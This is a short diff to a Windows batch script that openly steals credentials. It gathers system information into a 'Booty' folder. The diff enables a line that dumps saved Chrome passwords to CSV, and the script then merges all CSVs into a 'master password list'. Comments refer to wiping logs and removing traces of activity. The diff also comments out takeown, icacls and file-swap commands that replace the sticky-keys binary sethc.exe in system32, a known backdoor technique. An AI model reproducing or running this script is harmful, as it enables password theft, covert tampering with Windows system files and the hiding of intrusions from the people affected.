@@ -28,7 +28,7 @@ systeminfo /FO CSV > "Booty\systeminfo.csv"
 
 REM Chrome passwords
 :CHROME
-REM python chromepasswords.py -csv
+python chromepasswords.py -csv
 
 REM Create master password list
 type Booty\*.csv >> Booty\master_password_list.csv
@@ -40,11 +40,11 @@ REM remove all traces of activity
 REM wipe the logs
 
 REM put sticky keys back to normal
-takeown /f c:\windows\system32\cmd.exe
-takeown /f c:\windows\system32\sethc.exe
-icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
-icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
-move sethc.exe sethc.old.exe
-copy calc.exe sethc.exe
+REM takeown /f c:\windows\system32\cmd.exe
+REM takeown /f c:\windows\system32\sethc.exe
+REM icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
+REM icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
+REM move sethc.exe sethc.old.exe
+REM copy calc.exe sethc.exe
 pause
 REM take out the pause before deploying
